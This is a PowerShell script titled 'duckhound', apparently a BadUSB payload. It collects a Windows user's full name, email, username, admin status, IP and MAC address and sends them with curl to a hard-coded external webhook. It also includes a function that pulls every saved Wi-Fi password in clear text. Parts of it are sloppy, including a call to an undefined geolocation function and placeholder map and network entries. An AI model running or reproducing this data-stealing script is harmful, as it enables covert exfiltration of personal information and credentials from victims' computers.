# duckhound webhook script
# created by : C0SM0 & I am Jakoby

# change me
$webhook = "https://us-central1-obsidian-buffer.cloudfunctions.net/webhook/332fa6cc28b71b33771831cd455417413351fdc033ba73c8"

# variables
$account = $env:userprofile.Split('\')[2] 
$username = $env:username
$markdown = "$account.md"

# send content to obsidian
function send_to_obsidian {
    
    # file parameter
    [CmdletBinding()]
    param (   
    [Parameter (Position=0,Mandatory = $True)]
    [string]$message, 
    [Parameter (Position=1,Mandatory = $True)]
    [string]$file
    )

    # curl requests
    curl.exe -d "$message" -H "Content-Type: text/plain" $webhook"?path=$file"
}

function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return "NA"
    -ErrorAction SilentlyContinue
    }

    return $fullName 
}

function Get-email {
    
    try {

    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
	return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

# mark user information
function user_markdown {

    # general values
    $full_name = Get-fullName
    $email = Get-email
    $is_admin = ($currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    # network values
    # $public = curl.exe https://ident.me
    $private = (get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}).ipaddress[0]
    $MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)

    # geolocation values
    $geolocation = Get-GeoLocation


    # create markdown content
    $content = @"
# $account

## General
Full Name : $full_name
Email : $email

## User Info
UserName : $username
UserProfile : $account
Admin : $is_admin

## Wireless
Public : public
Private : $private
Mac : $MAC

## Connected Networks
- [[guest-wifi]]
- [[burgerking-wifi]]

## Nearby Networks
- #starbuck-wifi 
- #mcdonalds-guest

## Geolocation
<div class="mapouter"><div class="gmap_canvas"><iframe width="600" height="500" id="gmap_canvas" src="https://maps.google.com/maps?q=40.7484405,-73.9878531&t=k&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe><a href="https://2piratebay.org">pirate bay</a><br><style>.mapouter{position:relative;text-align:right;height:500px;width:600px;}</style><a href="https://www.embedgooglemap.net">google maps insert</a><style>.gmap_canvas {overflow:hidden;background:none!important;height:500px;width:600px;}</style></div></div>

## Tags
#user

"@
    # send data
    send_to_obsidian -message $content -file $markdown 

}

# mark wireless information
function wireless_markdown {
    # get wireless creds
    $creds = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
}

user_markdown